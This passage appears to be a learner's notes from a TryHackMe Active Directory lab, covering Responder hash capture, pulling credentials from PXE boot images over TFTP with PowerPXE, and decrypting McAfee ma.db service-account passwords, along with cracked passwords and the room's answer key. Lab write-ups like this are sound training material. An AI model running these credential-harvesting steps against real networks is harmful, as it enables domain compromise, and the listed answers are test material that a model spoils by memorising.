+SVCFILECOPY::ZA:e466c1f9214313dd:d9eede5affe46e8a28d0bfb9e002aefb:01010000000000000028b2736a05dc0170d7677237d5a54d00000000020008003100540034004a0001001e00570049004e002d0056004100550056004d00520044003000460059004f0004003400570049004e002d0056004100550056004d00520044003000460059004f002e003100540034004a002e004c004f00430041004c00030014003100540034004a002e004c004f00430041004c00050014003100540034004a002e004c004f00430041004c00070008000028b2736a05dc0106000400020000000800300030000000000000000000000000200000602bf2025763865048132fd65c35ba59373ec22388262020916ae7091c5624160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00370039002e00310038000000000000000000:FPassword1!
+
+
+
+[5.1. WHAT IS THE NAME OF THE TOOL WE CAN USE TO POISON AND CAPTURE AUTHENTICATION REQUESTS ON THE NETWORK?]
+[ANSWER]
+responder
+
+
+
+[5.2. WHAT IS THE USERNAME ASSOCIATED WITH THE CHALLENGE THAT WAS CAPTURED?]
+[ANSWER]
+svcfilecopy
+
+
+
+[5.3. WHAT IS THE VALUE OF THE CRACKED PASSWORD ASSOCIATED WITH THE CHALLENGE THAT WAS CAPTURED?]
+[ANSWER]
+FPassword1!
+
+
+
+
+[>>> TASK 6: MICROSOFT DEPLOYMENT TOOLKIT]
+[INFO: MDT]
+MDT (Microsoft Deployment Toolkit) is a MS service that automates deployment of MS OS.
+
+
+[INFO: SCCM]
+SCCM (System Center Configuration Manager) is a MS service that manages updates for all MS apps, services and OSs.
+MDT is usually integrated with SCCM.
+MDT is used for new deployments.
+
+
+[INFO: PXE BOOT]
+PXE (Preboot Execution Environment) boot is used by large orgs to allow new devices connected to network to load and install OSs directly over the network.
+MDT can create, manage and host PXE boot images.
+PXE boot is usually integrated with DHCP.
+If DHCP assigns an IP lease, host is allowed to request the PXE boot image and start the network OS installation process.
+Once process over, client uses TFTP connection to download PXE boot image.
+
+PXE boot image can be exploited for 2 purposes:
+1. Inject privesc vector (like local admin account) to gain admin access to OS once PXE boot is completed.
+2. Perform password scraping attacks to recover AD creds used during install.
+
+
+[INFO: PXE BOOT IMAGE RETRIEVAL]
+First, attacker attempts to request an IP and the PXE boot image preconfigure details from DHCP.
+We will skip this step, but perform rest steps.
+
+Pieces of info received via DHCP about PXE boot preconfigure:
+1. IP of the MDT server (displayed in thm room network diagram).
+2. Names of BCD files. 
+BCD files store info relevant to PXE boots for the different types of architectures.
+
+
+[ACTION: explore http://pxeboot.za.tryhackme.com] 
+[OUTPUT]
+pxeboot.za.tryhackme.com - /
+  8/4/2025  3:21 PM         8192 arm64{0159AF56-99EB-41BC-A022-16FFEF40C522}.bcd
+  8/4/2025  3:21 PM         8192 arm{A1A02B9F-EEA0-4108-B046-24006C52DC0C}.bcd
+  3/4/2022  9:41 PM          213 web.config
+  8/4/2025  3:21 PM        12288 x64uefi{551710B8-AED3-41B7-982C-A1DCCBB5C9D1}.bcd
+  8/4/2025  3:21 PM        12288 x64{39E30549-1063-4EFC-B124-D18F5DF31988}.bcd
+  8/4/2025  3:21 PM         8192 x86uefi{82351A1B-867F-4BA5-984B-65CAEBA4A970}.bcd
+  8/4/2025  3:21 PM        12288 x86x64{0342BF94-9F57-4B13-AE24-89769F016A08}.bcd
+  8/4/2025  3:21 PM         8192 x86{059E4F89-9882-4CC3-8C19-64486C205ADB}.bcd
+[NOTE]
+x64 architecture BCD file name:
+x64{39E30549-1063-4EFC-B124-D18F5DF31988}.bcd
+
+
+[NOTE]
+Creds: thm|Password1@
+[ACTION: ssh into THMJMP1 machine]
+ssh thm@THMJMP1.za.tryhackme.com
+
+
+[ACTION: make ssh accesible to all users on network]
+cd Documents
+copy C:\powerpxe thm\
+cd thm
+
+
+[NOTE]
+THMMDT ip: 10.200.80.202
+[ACTION: download BCD file]
+tftp -i 10.200.80.202 GET "\TMP\x64{39E30549-1063-4EFC-B124-D18F5DF31988}.bcd" conf.bcd
+
+
+[ACTION: run powershell, and recover locations of PXE boot images (from BCD file, via Get-WimFile]
+powershell -executionpolicy bypass
+Import-Module .\PowerPXE.ps1
+$BCDFile = "conf.bcd"
+Get-WimFile -bcdFile $BCDFile
+[OUTPUT]
+>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
+\Boot\x64\Images\LiteTouchPE_x64.wim
+PS C:\Users\thm\Documents\thm> >> Parse the BCD file: conf.bcd
+
+
+[ACTION: download image]
+tftp -i 10.200.80.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+[OUTPUT]
+C:\Windows\system32\TFTP.EXE: can't write to local file 'pxeboot.wim'
+
+
+[ACTION: run to pxebuut.wim]
+tftp -i 10.200.80.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxebuut.wim
+[OUTPUT]
+Transfer successful: 341899611 bytes in 235 second(s), 1454891 bytes/s  
+
+
+[ACTION: recover creds from bootstrap file]
+Get-FindCredentials -WimFile pxebuut.wim
+[OUTPUT]
+>> Open pxebuut.wim
+>>>> Finding Bootstrap.ini 
+Get-IniContent : Cannot process argument transformation on parameter  
+'FilePath'. Cannot convert value to type System.String.
+At C:\Users\thm\Documents\thm\PowerPXE.ps1:218 char:37
++         $Bootstrap = Get-IniContent $BootstrapPath
++                                     ~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Get-IniContent], Param  
+   eterBindingArgumentTransformationException
+    + FullyQualifiedErrorId : ParameterArgumentTransformationError,Get  
+   -IniContent
+ 
+>>>> >>>> DeployRoot =
+>>>> >>>> UserID =
+>>>> >>>> UserDomain =  
+>>>> >>>> UserPassword =
+[NOTE]
+Weird error: $BootstrapPath is null or not a string.
+Expected results:
+UserID = svcMDT
+UserPassword = PXEBootSecure1@
+
+
+
+[6.1. WHAT MICROSOFT TOOL IS USED TO CREATE AND HOST PXE BOOT IMAGES IN ORGANISATIONS?]
+[ANSWER]
+microsoft deployment toolkit
+
+
+
+[6.2. WHAT NETWORK PROTOCOL IS USED FOR RECOVERY OF FILES FROM THE MDT SERVER?]
+[ANSWER]
+tftp
+
+
+
+[6.3. WHAT IS THE USERNAME ASSOCIATED WITH THE ACCOUNT THAT WAS STORED IN THE PXE BOOT IMAGE?]
+[ANSWER]
+svcMDT
+
+
+
+[6.4. WHAT IS THE PASSWORD ASSOCIATED WITH THE ACCOUNT THAT WAS STORED IN THE PXE BOOT IMAGE?]
+[ANSWER]
+PXEBootSecure1@
+
+
+
+[6.5. WHILE YOU SHOULD MAKE SURE TO CLEANUP YOUR USER DIRECTORY THAT YOU CREATED AT THE START OF THIS TASK, IF YOU TRY YOU WILL NOTICE THAT YOU GET AN ACCESS DENIED ERROR. DON'T WORRY, A SCRIPT WILL HELP WITH THE CLEANUP PROCESS BUT REMEMBER WHEN YOU ARE DOING ASSESSMENTS TO ALWAYS PERFORM CLEANUP]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 7: CONFIGURATION FILES]
+[NOTE]
+ma.db is a config file where mcafee embeds creds used during installation.
+Said file is stored in fixed location: cd:\ProgramData\McAfee\Agent\DB
+[ACTION: move into fixed ma.db location and verify presence]
+cd C:\ProgramData\McAfee\Agent\DB
+dir
+[OUTPUT]
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/5/2022   6:45 PM         120832 ma.db
+
+
+
+[NOTE]
+Creds: thm|Password1@
+[ACTION: scp over to attacker]
+exit
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+
+
+[ACTION: browse databse]
+sqlitebrowser ma.db
+Go to: Browse Data
+Table: AGENT_REPOSITORIES
+[OUTPUT (for Tryhackme EPO row)]
+DOMAIN=za.tryhackme.com
+AUTH_USER=svcAV
+AUTH_PASSWD=jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+
+
+[ACTION: get updated tool]
+curl -o mcafee_sitelist_pwd_decrypt.py https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
+
+
+[ACTION: run tool (to check syntax)]
+python mcafee_sitelist_pwd_decrypt.py
+[OUTPUT]
+Usage:   mcafee_sitelist_pwd_decrypt.py <base64 passwd>
+Example: mcafee_sitelist_pwd_decrypt.py 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
+
+
+[ACTION: run tool with password]
+python mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+[OUTPUT]
+Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+Decrypted password : MyStrongPassword!
+
+
+
+[7.1. WHAT TYPE OF FILES OFTEN CONTAIN STORED CREDENTIALS ON HOSTS?]
+[ANSWER]
+configuration files
+
+
+
+[7.2. WHAT IS THE NAME OF THE MCAFEE DATABASE THAT STORES CONFIGURATION INCLUDING CREDENTIALS USED TO CONNECT TO THE ORCHESTRATOR?]
+[ANSWER]
+ma.db
+
+
+
+[7.3. WHAT TABLE IN THIS DATABASE STORES THE CREDENTIALS OF THE ORCHESTRATOR?]
+[ANSWER]
+AGENT_REPOSITORIES
+
+
+
+[7.4. WHAT IS THE USERNAME OF THE AD ACCOUNT ASSOCIATED WITH THE MCAFEE SERVICE?]
+[ANSWER]
+svcAV
+
+
+
+[7.5. WHAT IS THE PASSWORD OF THE AD ACCOUNT ASSOCIATED WITH THE MCAFEE SERVICE?]
+[ANSWER]
+MyStrongPassword!
+
+
+
+
+[>>> TASK 8: CONCLUSION]
+[8.1. I UNDERSTAND HOW CONFIGURATION CHANGES CAN HELP PREVENT AD BREACHES]
+Nothing to answer here.
